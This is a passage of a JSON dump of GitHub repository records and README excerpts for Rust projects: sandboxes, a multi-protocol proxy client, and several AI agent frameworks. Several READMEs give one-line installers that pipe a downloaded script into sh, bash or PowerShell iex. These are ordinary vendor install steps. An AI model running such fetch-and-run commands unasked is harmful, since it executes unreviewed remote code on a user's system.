caps = new CapabilitySet();\ncaps.allowPath(\"/data/models\", AccessMode.Read);\ncaps.allowPath(\"/tmp/workspace\", AccessMode.ReadWrite);\n\napply(caps);  // Irreversible ‚Äî kernel-enforced from here on\n```\n\n## Features\n\n### Kernel-Enforced Sandbox\n\nnono applies OS-level restrictions that cannot be bypassed or escalated from within the sandboxed process. Permissions are defined as capabilities granted before execution -- once the sandbox is applied, it is irreversible. All child processes inherit the same restrictions.\n\n| Platform | Mechanism |",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-27T03:26:03.348955"
  },
  {
    "basic_info": {
      "name": "IRBox",
      "full_name": "frank-vpl/IRBox",
      "owner": "frank-vpl",
      "description": "A versatile proxy client supporting multiple protocols including VLESS, VMess, Shadowsocks, Trojan, Hysteria2, and TUIC with advanced management features, subscription support, routing rules, and system proxy/TUN modes",
      "url": "https://github.com/frank-vpl/IRBox",
      "clone_url": "https://github.com/frank-vpl/IRBox.git",
      "ssh_url": "git@github.com:frank-vpl/IRBox.git",
      "homepage": "https://github.com/frank-vpl/IRBox/discussions",
      "created_at": "2026-02-15T14:48:54Z",
      "updated_at": "2026-02-27T01:50:08Z",
      "pushed_at": "2026-02-18T22:13:10Z"
    },
    "stats": {
      "stars": 494,
      "forks": 32,
      "watchers": 494,
      "open_issues": 7,
      "size": 8286
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 186761,
        "TypeScript": 108741,
        "CSS": 45498,
        "Batchfile": 8501,
        "Shell": 5673,
        "NSIS": 416,
        "HTML": 276
      },
      "license": "GNU General Public License v3.0",
      "topics": []
    },
    "content": {
      "readme": "<div align=\"center\">\n\n# üåê IRBox Client\n\n![IRBox Screenshot](screenshot.png)\n\n**A versatile and secure proxy client built with modern technologies to provide seamless and reliable internet connectivity**\n\nDesigned for privacy-conscious users, IRBox offers multi-protocol support, advanced routing capabilities, and intuitive management tools to ensure a smooth and secure browsing experience.\n\n[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](LICENSE) \n[![Releases](https://img.shields.io/github/downloads/frank-vpl/IRBox/total.svg)](https://github.com/frank-vpl/IRBox/releases/latest)\n[![Latest Release](https://img.shields.io/github/v/release/frank-vpl/IRBox)](https://github.com/frank-vpl/IRBox/releases/latest)\n\n[Farsi Version](README_FA.md)\n\n</div>\n\n## üöÄ Key Features\n\n### Multi-Protocol Support\n- **VLESS**\n- **VMess**\n- **Shadowsocks**\n- **Trojan**\n- **Hysteria2**\n- **TUIC**\n- **SSH**\n- **WireGuard**\n\n### Advanced Management\n- **Subscription Support** - Import and auto-update subscription URLs\n- **Routing Rules** - Domain-based rules (proxy/direct/block) with presets for ad blocking and regional bypass\n- **Split Tunneling** - Choose default route: proxy all traffic or selected domains\n\n### Connection Modes\n- **System Proxy** - HTTP proxy for system-wide access\n- **TUN Mode** - Full VPN capturing all traffic\n- **Admin Elevation** - One-click \"Run as Administrator\" for TUN mode\n\n### User Experience\n- **Onboarding** - Interactive guided tour for first-time users\n- **TCP Ping** - Bulk server latency testing\n- **Auto-select Best Server** - Intelligent server selection\n- **Themes** - 2 color themes (Dark, Light)\n- **Styles** - Default, Minimal\n\n## üéÅ Gift: Free Xray / sing-box Configs\n\nAs a small gift to the community, IRBox provides a **free public subscription** compatible with **Xray** and **sing-box** clients.\n\nüîó **Subscription URL:**\n```\nhttps://raw.githubusercontent.com/frank-vpl/servers/refs/heads/main/irbox\n```\n\n## üõ†Ô∏è Installation\n\n### Prerequisites\n- Rust and Cargo\n- Tauri CLI\n- NodeJS and NPM \n- Tauri prerequisites\n\n### Quick Setup\n\n1. **Clone the repository**\n   ```bash\n   git clone https://github.com/frank-vpl/IRBox.git\n   cd IRBox\n   ```\n\n2. **Install dependencies**\n   ```bash\n   npm install\n   ```\n   \n3. **Install Tauri CLI**\n   ```bash\n   cargo install tauri-cli --version ^2\n   ```\n\n4. **Download cores**\n\n   **Windows:**\n   ```bash\n   ./cores.bat\n   ```\n   \n   **Linux/macOS:**\n   ```bash\n   chmod +x cores.sh\n   ./cores.sh\n   ```\n\n## üöÄ Usage\n\n### Development\n```bash\ncargo tauri dev\n```\n\n### Production\n```bash\ncargo tauri build\n```\n\n## ü§ù Contributing\n\nContributions are welcome! Please feel free to submit a Pull Request. For major changes, please open an issue first to discuss what you would like to change.\n\n## üìÑ License\n\nThis project is licensed under the GNU General Public License v3.0 (GPL-3.0) - see the [LICENSE](LICENSE) file for details.\n\n### Core Technologies\n\nIRBox leverages the power of two leading proxy technologies:\n\n<div align=\"center\">\n\n| Core | Description |\n|------|-------------|\n| [Xray-core](https://github.com/XTLS/Xray-core) | A platform for building proxies to bypass network restrictions |\n| [sing-box](https://github.com/SagerNet/sing-box) | The universal proxy platform |\n\n</div>\n\n### Licenses of Third-Party Libraries\n\n- [Rust](https://www.rust-lang.org/) - [License](./licenses/rust.md)\n- [Tauri](https://v2.tauri.app/) - [License](./licenses/tauri.md)\n- [sing-box](https://github.com/SagerNet/sing-box) - [License](./licenses/sing-box.md)\n- [Xray-core](https://github.com/XTLS/Xray-core) - [License](./licenses/xray.md)\n\n## üôè Acknowledgments\n\n- Built with [Tauri](https://tauri.app/) - Framework for building secure native apps\n- Powered by [sing-box](https://github.com/SagerNet/sing-box) and [Xray-core](https://github.com/XTLS/Xray-core)\n- Inspired by the need for secure and flexible VPN solutions\n\n## üìö Documentation\n[IRBox Documentation](./docs/README.md)\n\n## üé® Design Assets\n\n<div align=\"center\">\n\n### App Logo & Icons\n![PiraIcons](https://img.shields.io/badge/Icons_by-Hossein_Pira-3d85c6?style=for-the-badge&logo=github)\n\n- Icons by Hossein Pira ‚Äì [PiraIcons](https://github.com/code3-dev/piraicons-assets) - [License](./licenses/piraicons.md)\n\n</div>\n\n## üß© Technologies Used\n\n<div align=\"center\">\n\n### Frontend Dependencies\n![React](https://img.shields.io/badge/React-20232a?style=for-the-badge&logo=react&logoColor=61DAFB)\n![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white)\n![Vite](https://img.shields.io/badge/Vite-B73BFE?style=for-the-badge&logo=vite&logoColor=FFD62E)\n\n### Framework & Core\n![Tauri](https://img.shields.io/badge/Tauri-FFD62E?style=for-the-badge&logo=tauri&logoColor=black)\n![Rust](https://img.shields.io/badge/Rust-000000?style=for-the-badge&logo=rust&logoColor=white)\n\n</div>\n\n### Dependencies\n- [react](https://react.dev/) - A JavaScript library for building user interfaces\n- [react-dom](https://rea",
      "default_branch": "master"
    },
    "fetched_at": "2026-02-27T03:26:04.490243"
  },
  {
    "basic_info": {
      "name": "shuru",
      "full_name": "superhq-ai/shuru",
      "owner": "superhq-ai",
      "description": "A local-first microVM sandbox for running AI agents safely on macOS",
      "url": "https://github.com/superhq-ai/shuru",
      "clone_url": "https://github.com/superhq-ai/shuru.git",
      "ssh_url": "git@github.com:superhq-ai/shuru.git",
      "homepage": "http://shuru.run/",
      "created_at": "2026-02-17T20:09:15Z",
      "updated_at": "2026-02-27T01:35:51Z",
      "pushed_at": "2026-02-26T20:34:50Z"
    },
    "stats": {
      "stars": 468,
      "forks": 7,
      "watchers": 468,
      "open_issues": 3,
      "size": 231
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 123111,
        "Astro": 24370,
        "Shell": 15076,
        "Just": 1482,
        "CSS": 1467,
        "JavaScript": 213
      },
      "license": "Apache License 2.0",
      "topics": []
    },
    "content": {
      "readme": "# shuru\n\nLocal-first microVM sandbox for AI agents on macOS.\n\nShuru boots lightweight Linux VMs using Apple's Virtualization.framework. Each sandbox is ephemeral: the rootfs resets on every run, giving agents a disposable environment to execute code, install packages, and run tools without touching your host.\n\n## Requirements\n\n- macOS 14 (Sonoma) or later on Apple Silicon\n\n## Install\n\n```sh\ncurl -fsSL https://raw.githubusercontent.com/superhq-ai/shuru/main/install.sh | sh\n```\n\n## Usage\n\n```sh\n# Interactive shell\nshuru run\n\n# Run a command\nshuru run -- echo hello\n\n# With network access\nshuru run --allow-net\n\n# Custom resources\nshuru run --cpus 4 --memory 4096 --disk-size 8192 -- make -j4\n```\n\n### Directory mounts\n\nShare host directories into the VM using VirtioFS. The host directory is read-only; guest writes go to a tmpfs overlay layer (discarded when the VM exits).\n\n```sh\n# Mount a directory (guest can write, host is untouched)\nshuru run --mount ./src:/workspace -- ls /workspace\n\n# Multiple mounts\nshuru run --mount ./src:/workspace --mount ./data:/data -- sh\n```\n\nMounts can also be set in `shuru.json` (see [Config file](#config-file)).\n\n> **Note:** Directory mounts require checkpoints created on v0.1.11+. Existing checkpoints work normally for all other features. Run `shuru upgrade` to get the latest version.\n\n### Port forwarding\n\nForward host ports to guest ports over vsock. Works without `--allow-net` ‚Äî the guest needs no network device.\n\n```sh\n# Install python3 into a checkpoint, then serve with port forwarding\nshuru checkpoint create py --allow-net -- apk add python3\nshuru run --from py -p 8080:8000 -- python3 -m http.server 8000\n\n# From the host (in another terminal)\ncurl http://127.0.0.1:8080/\n\n# Multiple ports\nshuru run -p 8080:80 -p 8443:443 -- nginx\n```\n\nPort forwards can also be set in `shuru.json` (see [Config file](#config-file)).\n\n### Checkpoints\n\nCheckpoints save the disk state so you can reuse an environment across runs.\n\n```sh\n# Set up an environment and save it\nshuru checkpoint create myenv --allow-net -- sh -c 'apk add python3 gcc'\n\n# Run from a checkpoint (ephemeral -- changes are discarded)\nshuru run --from myenv -- python3 script.py\n\n# Branch from an existing checkpoint\nshuru checkpoint create myenv2 --from myenv --allow-net -- sh -c 'pip install numpy'\n\n# List and delete\nshuru checkpoint list\nshuru checkpoint delete myenv\n```\n\n### Config file\n\nShuru loads `shuru.json` from the current directory (or `--config PATH`). All fields are optional; CLI flags take precedence.\n\n```json\n{\n  \"cpus\": 4,\n  \"memory\": 4096,\n  \"disk_size\": 8192,\n  \"allow_net\": true,\n  \"ports\": [\"8080:80\"],\n  \"mounts\": [\"./src:/workspace\", \"./data:/data\"],\n  \"command\": [\"python\", \"script.py\"]\n}\n```\n\n## Architecture\n\n```\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ  macOS Host                                 ‚îÇ\n‚îÇ                                             ‚îÇ\n‚îÇ  shuru-cli ‚îÄ‚îÄ‚ñ∫ shuru-vm ‚îÄ‚îÄ‚ñ∫ shuru-darwin    ‚îÇ\n‚îÇ                   ‚îÇ      (Virtualization.framework)\n‚îÇ                   ‚îÇ                         ‚îÇ\n‚îÇ         ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                ‚îÇ\n‚îÇ         ‚îÇ vsock :1024 exec ‚îÇ                ‚îÇ\n‚îÇ         ‚îÇ vsock :1025 fwd  ‚îÇ                ‚îÇ\n‚îÇ         ‚îÇ virtiofs  mounts ‚îÇ                ‚îÇ\n‚îÇ         ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ  Linux Guest     ‚îÇ                          ‚îÇ\n‚îÇ         ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                ‚îÇ\n‚îÇ         ‚îÇ   shuru-guest    ‚îÇ                ‚îÇ\n‚îÇ         ‚îÇ   (PID 1 init)   ‚îÇ                ‚îÇ\n‚îÇ         ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                ‚îÇ\n‚îÇ  Alpine Linux 3.21 / linux-virt 6.12        ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n```\n\n## Bugs\n\nFile issues at [github.com/superhq-ai/shuru/issues](https://github.com/superhq-ai/shuru/issues).\n",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-27T03:26:05.624775"
  },
  {
    "basic_info": {
      "name": "opencrabs",
      "full_name": "adolfousier/opencrabs",
      "owner": "adolfousier",
      "description": "The AI terminal-native orchestration layer for software development. Built with Rust",
      "url": "https://github.com/adolfousier/opencrabs",
      "clone_url": "https://github.com/adolfousier/opencrabs.git",
      "ssh_url": "git@github.com:adolfousier/opencrabs.git",
      "homepage": "",
      "created_at": "2026-02-14T00:05:58Z",
      "updated_at": "2026-02-27T02:28:05Z",
      "pushed_at": "2026-02-26T11:21:19Z"
    },
    "stats": {
      "stars": 447,
      "forks": 44,
      "watchers": 447,
      "open_issues": 0,
      "size": 16794
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 2111937,
        "Dockerfile": 1763
      },
      "license": "MIT License",
      "topics": [
        "agentic-framework",
        "open-source",
        "opencrab",
        "orchestration-framework"
      ]
    },
    "content": {
      "readme": "[![Rust](https://img.shields.io/badge/rust-%23000000.svg?style=for-the-badge&logo=rust&logoColor=white)](https://www.rust-lang.org)\n[![Rust Edition](https://img.shields.io/badge/rust-2024_edition-orange.svg)](https://www.rust-lang.org/)\n[![Ratatui](https://img.shields.io/badge/ratatui-%23000000.svg?style=for-the-badge&logo=rust&logoColor=white)](https://ratatui.rs)\n[![Docker](https://img.shields.io/badge/docker-%23000000.svg?style=for-the-badge&logo=docker&logoColor=white)](https://docker.com)\n[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE.md)\n[![CI](https://github.com/adolfousier/opencrabs/actions/workflows/ci.yml/badge.svg)](https://github.com/adolfousier/opencrabs/actions/workflows/ci.yml)\n[![GitHub Stars](https://img.shields.io/github/stars/adolfousier/opencrabs?style=social)](https://github.com/adolfousier/opencrabs)\n\n# ü¶Ä OpenCrabs\n\n**Rust-based open-claw inspired orchestration layer for software development.**\n\n> A terminal-native AI orchestration agent written in Rust with Ratatui. Inspired by [Open Claw](https://github.com/openclaw/openclaw).\n\n```\n    ___                    ___           _\n   / _ \\ _ __  ___ _ _    / __|_ _ __ _| |__  ___\n  | (_) | '_ \\/ -_) ' \\  | (__| '_/ _` | '_ \\(_-<\n   \\___/| .__/\\___|_||_|  \\___|_| \\__,_|_.__//__/\n        |_|\n\n ü¶Ä Shell Yeah! AI Orchestration at Rust Speed.\n\n```\n\n**Author:** [Adolfo Usier](https://github.com/adolfousier)\n\n‚≠ê Star us on [GitHub](https://github.com/adolfousier/opencrabs) if you like what you see!\n\n---\n\n## Table of Contents\n\n- [Screenshots](#-screenshots)\n- [Core Features](#-core-features)\n- [Supported AI Providers](#-supported-ai-providers)\n- [Agent-to-Agent (A2A) Protocol](#-agent-to-agent-a2a-protocol)\n- [Quick Start](#-quick-start)\n- [Onboarding Wizard](#-onboarding-wizard)\n- [API Keys (keys.toml)](#-api-keys-keystoml)\n- [Using Local LLMs](#-using-local-llms)\n- [Configuration](#-configuration)\n- [Tool System](#-tool-system)\n- [Plan Mode](#-plan-mode)\n- [Keyboard Shortcuts](#-keyboard-shortcuts)\n- [Debug and Logging](#-debug-and-logging)\n- [Architecture](#-architecture)\n- [Project Structure](#-project-structure)\n- [Development](#-development)\n- [Platform Notes](#-platform-notes)\n- [Troubleshooting](#-troubleshooting)\n- [Disclaimers](#-disclaimers)\n- [Contributing](#-contributing)\n- [License](#-license)\n- [Acknowledgments](#-acknowledgments)\n\n---\n\n## üì∏ Screenshots\n\n[![Demo](src/screenshots/opencrabs-demo.gif)](https://github.com/user-attachments/assets/dfc44f70-52e1-44f7-8aef-b57faf453761)\n\n![Splash](src/screenshots/splash.png)\n\n![Onboarding](src/screenshots/onboard1.png)\n\n![Provider Auth](src/screenshots/onboard2.png)\n\n![Workspace](src/screenshots/onboard3.png)\n\n![Home Base](src/screenshots/onboard4.png)\n\n![Chat](src/screenshots/opencrabs-ui.png)\n\n![Session Usage](src/screenshots/session-usage.png)\n\n![Rebuild Complete](src/screenshots/rebuild-dialog.png)\n\n---\n\n## üéØ Core Features\n\n### AI & Providers\n| Feature | Description |\n|---------|-------------|\n| **Multi-Provider** | Anthropic Claude, OpenAI, OpenRouter (400+ models), MiniMax, and any OpenAI-compatible API (Ollama, LM Studio, LocalAI). Model lists fetched live from provider APIs ‚Äî new models available instantly |\n| **Real-time Streaming** | Character-by-character response streaming with animated spinner showing model name and live text |\n| **Local LLM Support** | Run with LM Studio, Ollama, or any OpenAI-compatible endpoint ‚Äî 100% private, zero-cost |\n| **Cost Tracking** | Per-message token count and cost displayed in header; `/usage` shows all-time breakdown grouped by model with real costs + estimates for historical sessions |\n| **Context Awareness** | Live context usage indicator showing actual token counts (e.g. `ctx: 45K/200K (23%)`); auto-compaction at 70% with tool overhead budgeting; accurate tiktoken-based counting calibrated against API actuals |\n| **3-Tier Memory** | (1) **Brain MEMORY.md** ‚Äî user-curated durable memory loaded every turn, (2) **Daily Logs** ‚Äî auto-compaction summaries at `~/.opencrabs/memory/YYYY-MM-DD.md`, (3) **Hybrid Memory Search** ‚Äî FTS5 keyword search + local vector embeddings (embeddinggemma-300M, 768-dim) combined via Reciprocal Rank Fusion. Runs entirely local ‚Äî no API key, no cost, works offline |\n| **Dynamic Brain System** | System brain assembled from workspace MD files (SOUL, IDENTITY, USER, AGENTS, TOOLS, MEMORY) ‚Äî all editable live between turns |\n\n### Multimodal Input\n| Feature | Description |\n|---------|-------------|\n| **Image Attachments** | Paste image paths or URLs into the input ‚Äî auto-detected and attached as vision content blocks for multimodal models |\n| **PDF Support** | Attach PDF files by path ‚Äî native Anthropic PDF support; for other providers, text is extracted locally via `pdf-extract` |\n| **Document Parsing** | Built-in `parse_document` tool extracts text from PDF, DOCX, HTML, TXT, MD, JSON, XML |\n| **Voice (STT)** | Telegram voice notes transcribed via Groq Whisper (`whisper-large-v3-turbo`) and processed ",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-27T03:26:06.777204"
  },
  {
    "basic_info": {
      "name": "microclaw",
      "full_name": "microclaw/microclaw",
      "owner": "microclaw",
      "description": "ü¶ÄAn agentic AI assistant that lives in your chats, inspired by nanoclaw and incorporating some of its design ideas. Built with Rust ü¶Ä",
      "url": "https://github.com/microclaw/microclaw",
      "clone_url": "https://github.com/microclaw/microclaw.git",
      "ssh_url": "git@github.com:microclaw/microclaw.git",
      "homepage": "https://microclaw.ai",
      "created_at": "2026-02-07T08:28:51Z",
      "updated_at": "2026-02-27T02:50:08Z",
      "pushed_at": "2026-02-27T02:38:52Z"
    },
    "stats": {
      "stars": 429,
      "forks": 64,
      "watchers": 429,
      "open_issues": 5,
      "size": 8577
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 2095548,
        "TypeScript": 187916,
        "Shell": 33849,
        "CSS": 20480,
        "JavaScript": 7885,
        "PowerShell": 7756,
        "Dockerfile": 1615,
        "HTML": 300
      },
      "license": "MIT License",
      "topics": [
        "bot",
        "nanoclaw",
        "openclaw",
        "rust"
      ]
    },
    "content": {
      "readme": "# MicroClaw\n<img src=\"icon.png\" alt=\"MicroClaw logo\" width=\"56\" align=\"right\" />\n\n[English](README.md) | [‰∏≠Êñá](README_CN.md)\n\n[![Website](https://img.shields.io/badge/Website-microclaw.ai-blue)](https://microclaw.ai)\n[![Discord](https://img.shields.io/badge/Discord-Join-5865F2?logo=discord&logoColor=white)](https://discord.gg/pvmezwkAk5)\n[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)\n\n\n<p align=\"center\">\n  <img src=\"screenshots/headline.png\" alt=\"MicroClaw headline logo\" width=\"92%\" />\n</p>\n\n\n> **Note:** This project is under active development. Features may change, and contributions are welcome!\n\n\nAn agentic AI assistant for chat surfaces, inspired by [nanoclaw](https://github.com/gavrielc/nanoclaw/) and incorporating some of its design ideas. MicroClaw uses a channel-agnostic core with platform adapters: it currently supports Telegram, Discord, Slack, Feishu/Lark, Matrix, WhatsApp, iMessage, Email, Nostr, Signal, DingTalk, QQ, IRC, and Web, and is designed to add more platforms over time. It works with multiple LLM providers (Anthropic + OpenAI-compatible APIs) and supports full tool execution: run shell commands, read/write/edit files, search codebases, browse the web, schedule tasks, and maintain persistent memory across conversations.\n\n\n<p align=\"center\">\n  <img src=\"screenshots/screenshot1.png\" width=\"45%\" />\n  &nbsp;&nbsp;\n  <img src=\"screenshots/screenshot2.png\" width=\"45%\" />\n</p>\n\n## Table of contents\n\n- [How it works](#how-it-works)\n- [Install](#install)\n- [Features](#features)\n- [Tools](#tools)\n- [Memory](#memory)\n- [Skills](#skills)\n- [Plugins](#plugins)\n- [MCP](#mcp)\n- [Plan & Execute](#plan--execute)\n- [Scheduling](#scheduling)\n- [Local Web UI (cross-channel history)](#local-web-ui-cross-channel-history)\n- [Release](#release)\n- [Setup](#setup)\n- [Configuration](#configuration)\n- [Docker Sandbox](#docker-sandbox)\n- [Platform behavior](#platform-behavior)\n- [Multi-chat permission model](#multi-chat-permission-model)\n- [Usage examples](#usage-examples)\n- [Architecture](#architecture)\n- [Adding a New Platform Adapter](#adding-a-new-platform-adapter)\n- [Documentation](#documentation)\n\n## Install\n\n### One-line installer (recommended)\n\n```sh\ncurl -fsSL https://microclaw.ai/install.sh | bash\n```\n\n### Windows PowerShell installer\n\n```powershell\niwr https://microclaw.ai/install.ps1 -UseBasicParsing | iex\n```\n\nThis installer only does one thing:\n- Download and install the matching prebuilt binary from the latest GitHub release\n- It does not fallback to Homebrew/Cargo inside `install.sh` (use separate methods below)\n\n### Preflight diagnostics\n\nRun cross-platform diagnostics before first start (or when troubleshooting):\n\n```sh\nmicroclaw doctor\n```\n\nMachine-readable output for support tickets:\n\n```sh\nmicroclaw doctor --json\n```\n\nChecks include PATH, shell runtime, `agent-browser`, PowerShell policy (Windows), and MCP command dependencies from `<data_dir>/mcp.json` plus `<data_dir>/mcp.d/*.json`.\n\nSandbox-only diagnostics:\n\n```sh\nmicroclaw doctor sandbox\n```\n\n### Uninstall (script)\n\nmacOS/Linux:\n\n```sh\ncurl -fsSL https://microclaw.ai/uninstall.sh | bash\n```\n\nWindows PowerShell:\n\n```powershell\niwr https://microclaw.ai/uninstall.ps1 -UseBasicParsing | iex\n```\n\n### Homebrew (macOS)\n\n```sh\nbrew tap microclaw/tap\nbrew install microclaw\n```\n\n### From source\n\n```sh\ngit clone https://github.com/microclaw/microclaw.git\ncd microclaw\ncargo build --release\ncp target/release/microclaw /usr/local/bin/\n```\n\nOptional semantic-memory build (sqlite-vec disabled by default):\n\n```sh\ncargo build --release --features sqlite-vec\n```\n\nFirst-time sqlite-vec quickstart (3 commands):\n\n```sh\ncargo run --features sqlite-vec -- setup\ncargo run --features sqlite-vec -- start\nsqlite3 <data_dir>/runtime/microclaw.db \"SELECT id, chat_id, chat_channel, external_chat_id, category, embedding_model FROM memories ORDER BY id DESC LIMIT 20;\"\n```\n\nIn `setup`, set:\n- `embedding_provider` = `openai` or `ollama`\n- provider credentials/base URL/model as needed\n\n## How it works\n\nEvery message triggers an **agentic loop**: the model can call tools, inspect the results, call more tools, and reason through multi-step tasks before responding. Up to 100 iterations per request by default.\n\n<p align=\"center\">\n  <img src=\"docs/assets/readme/microclaw-architecture.svg\" alt=\"MicroClaw architecture overview\" width=\"96%\" />\n</p>\n\n## Blog post\n\nFor a deeper dive into the architecture and design decisions, read: **[Building MicroClaw: An Agentic AI Assistant in Rust That Lives in Your Chats](https://microclaw.ai/blog/building-microclaw)**\n\n## Features\n\n- **Agentic tool use** -- bash commands, file read/write/edit, glob search, regex grep, persistent memory\n- **Session resume** -- full conversation state (including tool interactions) persisted between messages; the agent keeps tool-call state across invocations\n- **Context compaction** -- when sessions grow too large, older messages are automatically summarized to stay within context li",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-27T03:26:07.932609"
  },
  {
    "basic_info": {
      "name": "pi_agent_rust",
      "full_name": "Dicklesworthstone/pi_agent_rust",
      "owner": "Dicklesworthstone",
      "description": "High-performance AI coding agent CLI written in Rust with zero unsafe code",
      "url": "https://github.com/Dicklesworthstone/pi_agent_rust",
      "clone_url": "https://github.com/Dicklesworthstone/pi_agent_rust.git",
      "ssh_url": "git@github.com:Dicklesworthstone/pi_agent_rust.git",
      "homepage": null,
      "created_at": "2026-02-02T20:58:01Z",
      "updated_at": "2026-02-27T00:12:34Z",
      "pushed_at": "2026-02-26T23:47:29Z"
    },
    "stats": {
      "stars": 427,
      "forks": 45,
      "watchers": 427,
      "open_issues": 1,
      "size": 97218
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 19695644,
        "Python": 8011918,
        "TypeScript": 6761495,
        "JavaScript": 2452095,
        "Shell": 2002674,
        "TeX": 929540,
        "HTML": 788786,
        "Go": 314626,
        "CSS": 161802,
        "Jinja": 160605,
        "BibTeX Style": 156486,
        "Java": 35230,
        "C#": 29255,
        "Jupyter Notebook": 10359,
        "HCL": 7142,
        "OpenSCAD": 5891,
        "Makefile": 4803,
        "Pkl": 2978,
        "Scala": 2353,
        "PLpgSQL": 1922,
        "C": 1709,
        "Dockerfile": 1596,
        "Nix": 222,
        "RenderScript": 1
      },
      "license": "Other",
      "topics": [
        "ai-agents",
        "cli",
        "developer-tools",
        "rust"
      ]
    },
    "content": {
      "readme": "<p align=\"center\">\n  <img src=\"pi_agent_rust_illustration.webp\" alt=\"Pi Agent Rust\" width=\"600\"/>\n</p>\n\n<h1 align=\"center\">pi_agent_rust</h1>\n\n<p align=\"center\">\n  <strong>pi_agent_rust - High-performance AI coding agent CLI written in Rust</strong>\n</p>\n\n<p align=\"center\">\n  <a href=\"#why-should-you-care\">Why Should You Care?</a> ‚Ä¢\n  <a href=\"#tldr-piopenclaw-users\">TL;DR</a> ‚Ä¢\n  <a href=\"#benchmark-methodology-and-claim-integrity\">Methodology</a> ‚Ä¢\n  <a href=\"#quick-start\">Quick Start</a> ‚Ä¢\n  <a href=\"#features\">Features</a> ‚Ä¢\n  <a href=\"#installation\">Installation</a> ‚Ä¢\n  <a href=\"#commands\">Commands</a> ‚Ä¢\n  <a href=\"#configuration\">Configuration</a>\n</p>\n\n<p align=\"center\">\n  <img src=\"https://img.shields.io/badge/rust-2024%20edition-orange?logo=rust\" alt=\"Rust 2024\">\n  <img src=\"https://img.shields.io/badge/license-MIT%20%2B%20Rider-blue\" alt=\"License: MIT + Rider\">\n  <img src=\"https://img.shields.io/badge/unsafe-forbidden-brightgreen\" alt=\"No Unsafe Code\">\n  <a href=\"https://github.com/Dicklesworthstone/pi_agent_rust/actions/workflows/ci.yml\">\n    <img src=\"https://github.com/Dicklesworthstone/pi_agent_rust/actions/workflows/ci.yml/badge.svg?branch=main\" alt=\"CI\">\n  </a>\n  <a href=\"https://github.com/Dicklesworthstone/pi_agent_rust/actions/workflows/bench.yml\">\n    <img src=\"https://github.com/Dicklesworthstone/pi_agent_rust/actions/workflows/bench.yml/badge.svg?branch=main\" alt=\"Bench\">\n  </a>\n</p>\n\n```bash\n# Install latest release\ncurl -fsSL \"https://raw.githubusercontent.com/Dicklesworthstone/pi_agent_rust/main/install.sh?$(date +%s)\" | bash\n```\n\n---\n\n## The Problem\n\nYou want an AI coding assistant in your terminal, but existing tools are:\n- **Slow to start**: Node.js/Python runtimes add 500ms+ before you can type\n- **Memory hungry**: Electron apps or heavy runtimes eat gigabytes\n- **Unreliable**: Streaming breaks, sessions corrupt, tools fail silently\n- **Hard to extend**: Closed ecosystems or complex plugin systems\n\n## The Solution\n\n**pi_agent_rust** is a from-scratch Rust port of [Pi Agent](https://github.com/badlogic/pi) by [Mario Zechner](https://github.com/badlogic) (made with his blessing!). Single binary, instant startup, stable streaming, and 7 built-in tools.\n\nRather than a direct line-by-line translation, this port builds on two purpose-built Rust libraries:\n- **[asupersync](https://github.com/Dicklesworthstone/asupersync)**: A structured concurrency async runtime with built-in HTTP, TLS, and SQLite\n- **[rich_rust](https://github.com/Dicklesworthstone/rich_rust)**: A Rust port of [Rich](https://github.com/Textualize/rich) by [Will 